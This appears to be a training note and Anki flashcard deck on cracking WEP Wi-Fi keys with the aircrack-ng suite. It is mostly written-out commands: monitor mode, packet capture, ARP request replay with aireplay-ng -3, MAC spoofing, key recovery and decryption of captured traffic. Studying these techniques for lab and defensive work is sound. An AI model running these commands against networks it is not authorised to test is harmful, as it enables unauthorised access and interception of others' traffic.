# Chain #19: ARP Request Replay Attack

## Purpose
Turn a captured ARP request into a high‑volume IV generator to speed up WEP key recovery with aircrack‑ng.

---
## Key Terms

- **IV (Initialization Vector)**: 24‑bit nonce prepended to the WEP key for RC4. Collecting many IVs enables statistical key recovery.
- **ARP (Address Resolution Protocol)**: Small, easily recognizable broadcast packets in LANs; ideal for replay because APs respond quickly.
- **ARP Request Replay (aireplay‑ng `-3`)**: Listens for a valid ARP request, re‑injects it to the AP, which re‑sends it repeatedly with new IVs.
- **PTW vs. Korek/FMS**: Aircrack‑ng’s default **PTW** statistical attack needs fewer IVs than older **Korek/FMS** methods.

---
## Step‑by‑Step Workflows

### 1) Enable monitor mode (see Chain 01/03 for background)

```bash
sudo airmon-ng start wlan0
```

- If warned about NetworkManager / wpa_supplicant, consider: `sudo airmon-ng check kill`.    
- Confirm:

```bash
iwconfig
# Expect: wlan0mon  IEEE 802.11  Mode:Monitor ...
```

### 2) Passive capture on the target AP (collect frames + IVs)

Lock to the AP’s channel and write captures to disk:

```bash
sudo airodump-ng wlan0mon -c 1 -w WEP
# -> creates WEP-01.cap (and related files)
```

- Optional focus on one BSSID: add `--bssid <AP_BSSID>`.

### 3) Launch ARP Request Replay (in a second terminal)

```bash
sudo aireplay-ng -3 -b B2:D1:AC:E1:21:D1 -h 4A:DD:C6:71:5A:3B wlan0mon
```

- `-3` = ARP request replay mode.
- `-b` = target AP BSSID.
- `-h` = your (spoofed or actual) client MAC used for injection.
- Tip: If you see **“The interface MAC ... doesn’t match the specified MAC (-h)”**, align them:

```bash
sudo ifconfig wlan0mon hw ether 4A:DD:C6:71:5A:3B
```

- Keep **airodump‑ng** running to capture replies while aireplay‑ng re‑injects.
- Healthy output looks like rapidly rising “got ARP requests … sent … (XXX pps)”.

### 4) Crack the WEP key with aircrack‑ng

After enough IVs accumulate in `WEP-01.cap`, attempt cracking:

```bash
sudo aircrack-ng -b B2:D1:AC:E1:21:D1 WEP-01.cap
# Default: PTW attack when applicable
```

- If you explicitly want Korek/FMS heuristics:

```bash
sudo aircrack-ng -K WEP-01.cap
```

### 5) Use the recovered key

Two common follow‑ups:

- **Connect** to the WEP network (see Chain 07’s WEP config with `wpa_supplicant`).    
- **Decrypt the capture** offline for analysis:

```bash
sudo airdecap-ng -w <WEP_hex_key> WEP-01.cap
# -> WEP-01-dec.cap
```

---
## Reference Snippets / Flags

- Monitor‑mode check: `iwconfig` → look for `Mode:Monitor`.    
- Airodump‑ng essentials:
    - `-c <ch>`: lock channel.
    - `--bssid <AP>`: stick to one AP.
    - `-w <prefix>`: write capture files.
- Aireplay‑ng (ARP replay):
    - `-3`: ARP request replay.
    - `-b <BSSID>`: target AP MAC.
    - `-h <STA>`: sender MAC used in injected frames.
- Aircrack‑ng:
    - default PTW (when data supports it).
    - `-K`: Korek/FMS methods.

---
## Summary

1. Put your NIC in **monitor mode**. 2) **Capture** on the AP’s channel with `airodump-ng`. 3) **Re‑inject** ARP requests with `aireplay-ng -3` to force the AP to emit many **new IVs**. 4) **Crack** with `aircrack-ng` (PTW by default). 5) **Use** the key to connect or decrypt captures.    

---
## Appendix – Fact‑Check Notes

- **Mechanics of ARP Request Replay** (capture ARP → re‑inject → AP resends with new IVs): Aircrack‑ng wiki “ARP request reinjection”. aircrack-ng.org/doku.php?id=arp-request_reinjection    
- **Aireplay‑ng purpose & `-3` attack**: Aircrack‑ng tool page. aircrack-ng.org/doku.php?id=aireplay-ng
- **PTW vs. FMS/Korek data needs**: Sources vary by dataset and success threshold. Aircrack‑ng docs emphasize “very few packets” for PTW; Wikipedia summarizes research as ~35–40k packets for ~50% success with PTW and hundreds of thousands to ~1M+ for FMS/Korek depending on conditions. aircrack-ng.org/doku.php?id=aircrack-ng ; en.wikipedia.org/wiki/Aircrack-ng
- **Using Airdecap‑ng after key recovery**: See Chain 05 in this series for exact flags and workflow.

---

```anki
#separator:tab
#html:true
#guid column:1
#notetype column:2
#deck column:3
#tags column:6

R19a1PtW01	Basic	Ops::WiFi Gym::Chain 19: ARP Request Replay	What does the aireplay-ng <code>-3</code> attack do?	Listens for a valid ARP request and replays it so the AP resends it with new IVs.	wifi
R19a1PtW02	Basic	Ops::WiFi Gym::Chain 19: ARP Request Replay	Why are ARP packets ideal for replay when cracking WEP?	They’re small broadcasts that trigger immediate AP responses, quickly generating many IVs.	wifi
R19a1PtW03	Basic (type in the answer)	Ops::WiFi Gym::Chain 19: ARP Request Replay	Which command enables monitor mode on <code>wlan0</code>?	<code>sudo airmon-ng start wlan0</code>	wifi
R19a1PtW04	Basic (type in the answer)	Ops::WiFi Gym::Chain 19: ARP Request Replay	Which command confirms that <code>wlan0mon</code> is in monitor mode?	<code>iwconfig</code>	wifi
R19a1PtW05	Basic (type in the answer)	Ops::WiFi Gym::Chain 19: ARP Request Replay	Which <code>airodump-ng</code> command locks to channel 1 and writes to prefix <code>WEP</code> using <code>wlan0mon</code>?	<code>sudo airodump-ng wlan0mon -c 1 -w WEP</code>	wifi
R19a1PtW06	Basic (type in the answer)	Ops::WiFi Gym::Chain 19: ARP Request Replay	Which <code>aireplay-ng</code> command launches an ARP replay against BSSID <code>B2:D1:AC:E1:21:D1</code> using client <code>4A:DD:C6:71:5A:3B</code> on <code>wlan0mon</code>?	<code>sudo aireplay-ng -3 -b B2:D1:AC:E1:21:D1 -h 4A:DD:C6:71:5A:3B wlan0mon</code>	wifi
R19a1PtW07	Basic (type in the answer)	Ops::WiFi Gym::Chain 19: ARP Request Replay	If aireplay-ng warns that the interface MAC doesn’t match <code>-h</code>, which command sets <code>wlan0mon</code> MAC to <code>4A:DD:C6:71:5A:3B</code>?	<code>sudo ifconfig wlan0mon hw ether 4A:DD:C6:71:5A:3B</code>	wifi
R19a1PtW08	Basic (type in the answer)	Ops::WiFi Gym::Chain 19: ARP Request Replay	Which <code>aircrack-ng</code> command attempts to crack BSSID <code>B2:D1:AC:E1:21:D1</code> from capture <code>WEP-01.cap</code>?	<code>sudo aircrack-ng -b B2:D1:AC:E1:21:D1 WEP-01.cap</code>	wifi
R19a1PtW09	Basic (type in the answer)	Ops::WiFi Gym::Chain 19: ARP Request Replay	Which option tells aircrack-ng to use Korek/FMS methods instead of the default?	<code>-K</code>	wifi
R19a1PtW10	Cloze (type in the answer)	Ops::WiFi Gym::Chain 19: ARP Request Replay	PTW vs. Korek/FMS: PTW generally needs {{c1::fewer IVs}} than Korek/FMS for WEP key recovery.		wifi
R19a1PtW11	Basic	Ops::WiFi Gym::Chain 19: ARP Request Replay	What file name does airodump-ng create when writing with prefix <code>WEP</code>?	<code>WEP-01.cap</code>	wifi
R19a1PtW12	Basic (type in the answer)	Ops::WiFi Gym::Chain 19: ARP Request Replay	After cracking, which tool decrypts <code>WEP-01.cap</code> with a recovered WEP key?	<code>airdecap-ng</code>	wifi
R19a1PtW13	Basic	Ops::WiFi Gym::Chain 19: ARP Request Replay	What does a rapidly increasing “got &lt;N&gt; ARP requests … (pps)” counter indicate during <code>-3</code> replay?	Successful ARP captures/reinjections generating many new IVs.	wifi
R19a1PtW14	Basic (type in the answer)	Ops::WiFi Gym::Chain 19: ARP Request Replay	In <code>aireplay-ng -3 -b &lt;AP&gt; -h &lt;STA&gt; wlan0mon</code>, what do <code>-b</code> and <code>-h</code> specify?	<code>-b</code> the AP BSSID; <code>-h</code> the client MAC used for injection.	wifi
R19a1PtW15	Cloze (type in the answer)	Ops::WiFi Gym::Chain 19: ARP Request Replay	A valid ARP request is {{c1::captured}}, then {{c1::replayed}} to the AP, which responds with new {{c1::IVs}}.		wifi
```